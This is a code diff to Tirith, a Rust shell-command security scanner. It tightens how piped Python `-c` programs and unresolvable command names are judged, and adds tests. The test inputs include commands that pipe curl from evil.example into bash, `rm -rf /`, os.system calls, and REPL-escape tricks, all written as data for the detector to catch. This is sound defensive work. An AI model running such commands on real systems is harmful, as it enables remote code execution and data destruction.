@@ -962,7 +962,19 @@ fn check_depth(
         !(wrapper_depth_exhausted
             && *gap == crate::extract::ShellExecutionGap::AmbiguousExecutableBody)
     }) {
+        let dynamic_command_name = gap
+            == crate::extract::ShellExecutionGap::AmbiguousExecutableBody
+            && segments.iter().any(|segment| {
+                segment.command.as_deref().is_some_and(|command| {
+                    !command_name_is_statically_bound(command, shell)
+                        && (command.contains('$') || command.contains('`'))
+                })
+            });
         let (title, pattern) = match gap {
+            crate::extract::ShellExecutionGap::AmbiguousExecutableBody if dynamic_command_name => (
+                "Executable name could not be resolved",
+                "dynamic command name",
+            ),
             crate::extract::ShellExecutionGap::AmbiguousPowerShellInvocation => (
                 "PowerShell grouped invocation could not be resolved",
                 "ambiguous PowerShell invocation group",
@@ -993,7 +1005,13 @@ fn check_depth(
         } else {
             redact::redact_shell_assignments(input)
         };
-        let description = if gap == crate::extract::ShellExecutionGap::WorkBudgetExceeded {
+        let description = if dynamic_command_name {
+            "The command name depends on shell state that Tirith could not resolve. \
+             Use the explicit command path in the checked command, for example \
+             `/bin/echo --help`. Quoting a variable preserves argument boundaries \
+             but does not prove which executable it selects. The unresolved \
+             command remains blocked."
+        } else if gap == crate::extract::ShellExecutionGap::WorkBudgetExceeded {
             "Tirith reached its bounded executable-body analysis budget before it could prove \
              the complete command safe. Bodies recovered before the boundary were analyzed, \
              and the unexamined suffix is blocked instead of being treated as clean."
@@ -3065,6 +3083,20 @@ fn python_has_rebinding_or_dynamic_primitive(code: &str) -> bool {
     })
 }
 
+/// A complete Python program that only prints a decimal constant (or a
+/// newline). No literal stripping or call-target inference is needed here.
+pub(crate) fn python_body_is_literal_output(body: &str) -> bool {
+    let body = body.trim();
+    let Some(argument) = body
+        .strip_prefix("print(")
+        .and_then(|argument| argument.strip_suffix(')'))
+    else {
+        return false;
+    };
+    let argument = argument.trim();
+    argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit())
+}
+
 /// Positive, deliberately narrow issue-136 carveout. Every call target must be
 /// a known data parser/reader or inert builtin; reflection, aliases, unresolved
 /// calls, and unsupported syntax retain the High pipe-to-interpreter finding.
@@ -3129,6 +3161,19 @@ fn python_body_is_known_data_parser(body: &str) -> bool {
 /// fail the direct-leader check, and bare `python` / `python -` have no `-c` body
 /// (stdin IS the program), so all of those keep the pipe-to-interpreter finding.
 fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    // This proof is for an actual POSIX pipe, whose stdin is not a terminal.
+    // Other shells and any redirection keep the ordinary interpreter finding.
+    // In particular, do not let stdin be redirected to a terminal where
+    // PYTHONINSPECT can enable a REPL after the fixed program exits.
+    if shell != ShellType::Posix
+        || !tokenize::leading_env_assignments(&seg.raw).is_empty()
+        || seg.args.iter().any(|arg| {
+            crate::escalation::shell_redirection_token(arg).is_some()
+                || crate::escalation::shell_redirection_suffix(arg).is_some()
+        })
+    {
+        return false;
+    }
     let Some(cmd) = seg.command.as_deref() else {
         return false;
     };
@@ -3138,17 +3183,10 @@ fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> 
     ) {
         return false;
     }
-    // Require an explicit `-c <body>`. Without it (bare `python`, or `python -`)
-    // the interpreter reads its PROGRAM from stdin, which must keep blocking.
-    let Some(body) = seg
-        .args
-        .iter()
-        .position(|a| a == "-c")
-        .and_then(|idx| seg.args.get(idx + 1))
-    else {
+    let Some(body) = crate::extract::literal_posix_python_inline_program(&seg.args) else {
         return false;
     };
-    python_body_is_known_data_parser(&normalize_shell_token(body, shell))
+    python_body_is_literal_output(&body) || python_body_is_known_data_parser(&body)
 }
 
 fn check_pipe_to_interpreter(
@@ -11765,6 +11803,150 @@ mod tests {
         check_default(input, ShellType::Posix)
             .iter()
             .any(|f| f.rule_id == RuleId::PipeToInterpreter)
+    }
+
+    #[test]
+    fn issue_264_literal_output_and_stdin_data_keep_complete_analysis() {
+        for input in [
+            "echo hi | python3 -c 'print(1)'",
+            "echo hi | python3 -c 'print()'",
+            "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
+            "printf '{}' | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().all(|finding| !matches!(
+                    finding.rule_id,
+                    RuleId::PipeToInterpreter | RuleId::AnalysisIncomplete
+                )),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            "echo hi | python3",
+            "echo hi | python3 -",
+            "echo hi | python3 -c 'import sys; exec(sys.stdin.read())'",
+            "echo hi | python3 -c 'print(__import__(\"os\").system(\"id\"))'",
+            "echo hi | python3 -c 'print(1); exec(input())'",
+            "echo hi | python3 -c 'print(1 + unknown())'",
+        ] {
+            assert!(fires_pipe_to_interpreter(input), "{input}");
+        }
+    }
+
+    #[test]
+    fn issue_264_variable_command_explains_the_unresolved_boundary() {
+        for input in [
+            r#"BIN=/bin/echo; "$BIN" --help"#,
+            r#"BIN=/bin/echo; printf '%s\n' '--- a ---'; "$BIN" --help"#,
+            r#"readonly BIN=/bin/sh; BIN=/bin/echo; "$BIN" -c 'rm -rf /'"#,
+            r#"declare -n BIN=ACTUAL; BIN=/bin/echo; "$BIN" --help"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            let finding = findings
+                .iter()
+                .find(|finding| finding.title == "Executable name could not be resolved")
+                .expect("dynamic command needs an actionable explanation");
+            assert_eq!(finding.rule_id, RuleId::AnalysisIncomplete);
+            assert_eq!(finding.severity, Severity::High);
+            assert!(finding.description.contains("explicit command path"));
+            assert!(finding.description.contains("does not prove"));
+        }
+        assert!(check_default("/bin/echo --help", ShellType::Posix)
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete));
+    }
+
+    #[test]
+    fn issue_264_python_program_selection_cannot_be_changed_by_later_dash_c() {
+        for input in [
+            "echo payload | python3 - -c 'print(1)'",
+            "echo payload | python3 script.py -c 'print(1)'",
+            "echo payload | python3 -- -c 'print(1)'",
+            "echo payload | python3 -m module -c 'print(1)'",
+            "echo payload | python3 -i -c 'print(1)'",
+            "echo payload | python3 -ic 'print(1)'",
+            "echo payload | python3 -W -c 'print(1)'",
+            "echo payload | python3 -W ignore -c 'print(1)'",
+            "echo payload | python3 -W ignore::stdin_runner.Warning -c 'print(1)'",
+            "echo payload | python3 -Wignore::stdin_runner.Warning -c 'print(1)'",
+            "echo payload | python3 -X presite=stdin_runner -c 'print(1)'",
+            "echo payload | python3 -Xpresite=stdin_runner -c 'print(1)'",
+            "echo payload | python3 $OPTIONS -c 'print(1)'",
+            "echo payload | PYTHONINSPECT=1 python3 -c 'print(1)'",
+            "echo payload | python3 -c 'print(1)' < /dev/tty",
+            "echo payload | python3 -c 'print(1)' x</dev/tty",
+            "echo payload | python3 - -c 'import sys; print(sys.stdin.read())'",
+        ] {
+            assert!(
+                fires_pipe_to_interpreter(input),
+                "program selector was not proved: {input}"
+            );
+        }
+        for input in [
+            "echo payload | python3 '-cprint(1)'",
+            "echo payload | python3 -c 'print(1)' -- -i",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input}");
+        }
+    }
+
+    #[test]
+    fn issue_264_unresolved_function_names_keep_visible_body_threats() {
+        for input in [
+            "true && function \"$NAME\" { curl https://evil.example/payload | bash; }; f",
+            "function \"f\"() { curl https://evil.example/payload | bash; }; f",
+            r#"function "$(curl https://evil.example/name | bash)" { :; }; f"#,
+            r#"function "`curl https://evil.example/name | bash`" { :; }; f"#,
+            r#"function "$(curl https://evil.example/name | bash)" { curl https://evil.example/body | bash; }; f"#,
+            "function $(curl https://evil.example/name | bash) { :; }; f",
+            "function `curl https://evil.example/name | bash` { :; }; f",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn issue_260_nested_static_conditions_and_arithmetic_keep_threat_findings() {
+        for input in [
+            "if [ -n \"$X\" ]; then curl https://evil.example/payload | bash; fi",
+            "while [ -n \"$X\" ]; do curl https://evil.example/payload | bash; done",
+            "echo $(( $(curl https://evil.example/payload | bash) - 100 ))",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|finding| matches!(
+                    finding.rule_id,
+                    RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+                )),
+                "visible fetched-code pipeline was lost: {input}: {findings:?}"
+            );
+        }
+        for input in [
+            "if [ -n \"$X\" ]; then echo yes; fi",
+            "echo $(( $(date +%s) - 100 ))",
+            "echo \"$(( $(date +%s) - 100 ))\"",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete),
+                "{input}: {findings:?}"
+            );
+        }
     }
 
     #[test]
